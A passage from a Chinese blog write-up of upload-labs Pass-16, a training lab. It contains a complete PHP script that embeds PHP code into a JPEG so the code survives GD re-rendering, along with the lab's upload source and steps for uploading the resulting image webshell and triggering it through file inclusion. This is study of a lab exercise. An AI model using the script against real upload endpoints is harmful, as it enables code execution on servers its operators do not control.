class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?php</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class=\"line\"><span class=\"comment\">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class=\"line\"><span class=\"comment\">    2) Save the processed image and launch:</span></span><br><span class=\"line\"><span class=\"comment\">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class=\"line\"><span class=\"comment\">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class=\"line\"><span class=\"comment\">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class=\"line\"><span class=\"comment\">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    Sergey Bobrov <span class=\"doctag\">@Black</span>2Fan.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    See also:</span></span><br><span class=\"line\"><span class=\"comment\">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$miniPayload</span> = <span class=\"string\">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">&#x27;gd&#x27;</span>) || !function_exists(<span class=\"string\">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    set_error_handler(<span class=\"string\">&quot;custom_error_handler&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$pad</span> = <span class=\"number\">0</span>; <span class=\"variable\">$pad</span> &lt; <span class=\"number\">1024</span>; <span class=\"variable\">$pad</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$nullbytePayloadSize</span> = <span class=\"variable\">$pad</span>;</span><br><span class=\"line\">        <span class=\"variable\">$dis</span> = <span class=\"keyword\">new</span> DataInputStream(<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$outStream</span> = file_get_contents(<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$extraBytes</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"variable\">$correctImage</span> = <span class=\"literal\">TRUE</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$dis</span>-&gt;readShort() != <span class=\"number\">0xFFD8</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>((!<span class=\"variable\">$dis</span>-&gt;eof()) &amp;&amp; (<span class=\"variable\">$dis</span>-&gt;readByte() == <span class=\"number\">0xFF</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$marker</span> = <span class=\"variable\">$dis</span>-&gt;readByte();</span><br><span class=\"line\">            <span class=\"variable\">$size</span> = <span class=\"variable\">$dis</span>-&gt;readShort() - <span class=\"number\">2</span>;</span><br><span class=\"line\">            <span class=\"variable\">$dis</span>-&gt;skip(<span class=\"variable\">$size</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$marker</span> === <span class=\"number\">0xDA</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$startPos</span> = <span class=\"variable\">$dis</span>-&gt;seek();</span><br><span class=\"line\">                <span class=\"variable\">$outStreamTmp</span> = </span><br><span class=\"line\">                    substr(<span class=\"variable\">$outStream</span>, <span class=\"number\">0</span>, <span class=\"variable\">$startPos</span>) . </span><br><span class=\"line\">                    <span class=\"variable\">$miniPayload</span> . </span><br><span class=\"line\">                    str_repeat(<span class=\"string\">&quot;\\0&quot;</span>,<span class=\"variable\">$nullbytePayloadSize</span>) . </span><br><span class=\"line\">                    substr(<span class=\"variable\">$outStream</span>, <span class=\"variable\">$startPos</span>);</span><br><span class=\"line\">                checkImage(<span class=\"string\">&#x27;_&#x27;</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>], <span class=\"variable\">$outStreamTmp</span>, <span class=\"literal\">TRUE</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"variable\">$extraBytes</span> !== <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span>((!<span class=\"variable\">$dis</span>-&gt;eof())) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"variable\">$dis</span>-&gt;readByte() === <span class=\"number\">0xFF</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span>(<span class=\"variable\">$dis</span>-&gt;readByte !== <span class=\"number\">0x00</span>) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"variable\">$stopPos</span> = <span class=\"variable\">$dis</span>-&gt;seek() - <span class=\"number\">2</span>;</span><br><span class=\"line\">                    <span class=\"variable\">$imageStreamSize</span> = <span class=\"variable\">$stopPos</span> - <span class=\"variable\">$startPos</span>;</span><br><span class=\"line\">                    <span class=\"variable\">$outStream</span> = </span><br><span class=\"line\">                        substr(<span class=\"variable\">$outStream</span>, <span class=\"number\">0</span>, <span class=\"variable\">$startPos</span>) . </span><br><span class=\"line\">                        <span class=\"variable\">$miniPayload</span> . </span><br><span class=\"line\">                        substr(</span><br><span class=\"line\">                            str_repeat(<span class=\"string\">&quot;\\0&quot;</span>,<span class=\"variable\">$nullbytePayloadSize</span>).</span><br><span class=\"line\">                                substr(<span class=\"variable\">$outStream</span>, <span class=\"variable\">$startPos</span>, <span class=\"variable\">$imageStreamSize</span>),</span><br><span class=\"line\">                            <span class=\"number\">0</span>,</span><br><span class=\"line\">                            <span class=\"variable\">$nullbytePayloadSize</span>+<span class=\"variable\">$imageStreamSize</span>-<span class=\"variable\">$extraBytes</span>) . </span><br><span class=\"line\">                                substr(<span class=\"variable\">$outStream</span>, <span class=\"variable\">$stopPos</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">elseif</span>(<span class=\"variable\">$correctImage</span>) &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$outStream</span> = <span class=\"variable\">$outStreamTmp</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(checkImage(<span class=\"string\">&#x27;payload_&#x27;</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>], <span class=\"variable\">$outStream</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Success!&#x27;</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unlink(<span class=\"string\">&#x27;payload_&#x27;</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Something\\&#x27;s wrong&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>, <span class=\"variable\">$unlink</span> = <span class=\"literal\">FALSE</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$correctImage</span>;</span><br><span class=\"line\">        file_put_contents(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">        <span class=\"variable\">$correctImage</span> = <span class=\"literal\">TRUE</span>;</span><br><span class=\"line\">        imagecreatefromjpeg(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$unlink</span>)</span><br><span class=\"line\">            unlink(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$correctImage</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">custom_error_handler</span>(<span class=\"params\"><span class=\"variable\">$errno</span>, <span class=\"variable\">$errstr</span>, <span class=\"variable\">$errfile</span>, <span class=\"variable\">$errline</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$extraBytes</span>, <span class=\"variable\">$correctImage</span>;</span><br><span class=\"line\">        <span class=\"variable\">$correctImage</span> = <span class=\"literal\">FALSE</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/(\\d+) extraneous bytes before marker/&#x27;</span>, <span class=\"variable\">$errstr</span>, <span class=\"variable\">$m</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$m</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$extraBytes</span> = (<span class=\"keyword\">int</span>)<span class=\"variable\">$m</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DataInputStream</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$binData</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$order</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$size</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$filename</span>, <span class=\"variable\">$order</span> = <span class=\"literal\">false</span>, <span class=\"variable\">$fromString</span> = <span class=\"literal\">false</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;order = <span class=\"variable\">$order</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!<span class=\"variable\">$fromString</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!file_exists(<span class=\"variable\">$filename</span>) || !is_file(<span class=\"variable\">$filename</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;File not exists [&#x27;</span>.<span class=\"variable\">$filename</span>.<span class=\"string\">&#x27;]&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;binData = file_get_contents(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;binData = <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;size = strlen(<span class=\"keyword\">$this</span>-&gt;binData);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">seek</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"keyword\">$this</span>-&gt;size - strlen(<span class=\"keyword\">$this</span>-&gt;binData));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">skip</span>(<span class=\"params\"><span class=\"variable\">$skip</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"variable\">$skip</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readByte</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;eof()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;End Of File&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"variable\">$byte</span> = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ord(<span class=\"variable\">$byte</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readShort</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen(<span class=\"keyword\">$this</span>-&gt;binData) &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;End Of File&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"variable\">$short</span> = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;order) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$short</span> = (ord(<span class=\"variable\">$short</span>[<span class=\"number\">1</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord(<span class=\"variable\">$short</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$short</span> = (ord(<span class=\"variable\">$short</span>[<span class=\"number\">0</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord(<span class=\"variable\">$short</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$short</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eof</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> !<span class=\"keyword\">$this</span>-&gt;binData||(strlen(<span class=\"keyword\">$this</span>-&gt;binData) === <span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"准备-1\"><a href=\"#准备-1\" class=\"headerlink\" title=\"准备\"></a>准备</h4><p>​    准备一个<strong>yoo.jpg</strong>图片，上传经过渲染以后再下载下到本地，保存为<strong>1.jpg</strong>。</p>\n<h4 id=\"插入代码\"><a href=\"#插入代码\" class=\"headerlink\" title=\"插入代码\"></a>插入代码</h4><p>​    使用脚本处理<strong>1.jpg</strong>插入php代码，执行命令<code>php jpg_payload.php 1.jpg</code>。php命令执行方法上面有。执行成功以后应该如图所示：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116212640.png\"></p>\n<p>​    执行的目录下会多出一个名为<code>payload_1.jpg</code>的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。</p>\n<h4 id=\"上传并验证\"><a href=\"#上传并验证\" class=\"headerlink\" title=\"上传并验证\"></a>上传并验证</h4><p>​    上传以后同样先确定图片的名称和地址，适用文件包含进行验证</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116215008.png\"></p>\n<p>​    如果如图所示，我们的图片马就上传成功了。<strong>需要提醒：有些图片不行可能需要多换几个图片试一试！！！</strong></p>\n<p>呼，终于可以休息了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。</p>\n<p>​    参考博客：<a href=\"https://xz.aliyun.com/t/2657#toc-4\">upload-labs之pass 16详细分析</a></p>\n<h2 id=\"Pass-16\"><a href=\"#Pass-16\" class=\"headerlink\" title=\"Pass-16\"></a>Pass-16</h2><p>​    源码（三种图片的判定，只贴一个吧，篇幅小一点）：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmpname</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>=UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.basename(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的扩展名</span></span><br><span class=\"line\">    <span class=\"variable\">$fileext</span>= substr(strrchr(<span class=\"variable\">$filename</span>,<span class=\"string\">&quot;.&quot;</span>),<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;jpg&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefromjpeg(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.jpg&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagejpeg(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;png&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/png&quot;</span>))&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;gif&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span>))&#123;</span><br><span class=\"line\">        .....</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    提示：<code>本pass重新渲染了图片！</code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。</p>\n<p>​    首先是分析一波源码：</p>\n<p>​    以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行<code>move_uploaded_file</code>函数先把文件移动到<code>upload</code>文件夹，现在文件路径是<code>$target_path</code>，之后对图片进行二次渲染。</p>\n<p>​    二次渲染用到了<code>imagecreatefromjpeg</code>函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行<code>unlink</code>函数删除文件，否则，为新图片随机一个名称，执行<code>imagejpeg</code>函数把图象输出到新文件<code> $newfilename</code>。再将之前用户上传的文件<code>$target_path</code>删除掉。</p>\n<p>​    根据上面的分析就能得出来两种思路：</p>\n<ol>\n<li><strong>访问二次渲染之前的上传的文件。</strong></li>\n<li><strong>在图片二次渲染以后图片马未失效。</strong></li>\n</ol>\n<h2 